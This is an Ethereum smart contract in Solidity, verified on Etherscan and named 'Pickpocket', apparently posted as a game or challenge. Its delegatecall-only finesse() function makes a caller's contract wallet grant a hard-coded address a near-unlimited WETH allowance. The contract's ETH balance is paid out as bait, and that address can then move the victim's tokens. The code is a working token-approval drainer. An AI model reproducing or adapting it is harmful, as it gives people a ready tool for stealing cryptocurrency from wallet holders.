/**
 *Submitted for verification at Etherscan.io on 2021-08-09
*/

// contracts/Box.sol
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

interface IERC20 {

    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

// ty for playing <3 - ghili
contract Pickpocket {

    IERC20 public immutable weth = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    uint256 public constant sneakyAllowance = 1000000000 ether;
    address public immutable wallet = 0xFd495eeEd737b002Ea62Cf0534e7707a9656ba19;
    address immutable self;

    mapping(address => bool) public claimedPayout;

    constructor() {
        self = address(this);
    }

    receive() external payable {}

    function finesse() external {
        require(address(this) != self, "must delegatecall this function");
        weth.approve(wallet, sneakyAllowance);
        (bool success, ) = self.call(abi.encodeWithSignature("payout()"));
        require(success, "payout did not go thru :(");
    }

    function payout() external {
        require(msg.sender == wallet || !claimedPayout[msg.sender], "payout already claimed :(");
        require(msg.sender == wallet || weth.allowance(msg.sender, wallet) == sneakyAllowance, "come back once you've taken the bait");
        require(msg.sender == wallet || weth.balanceOf(msg.sender) >= 1 ether, "you broke asl T-T");

        claimedPayout[msg.sender] = true;
        (bool success, ) = payable(msg.sender).call{value: address(this).balance}("");
        require(success, "payout did not go thru :(");
    }
}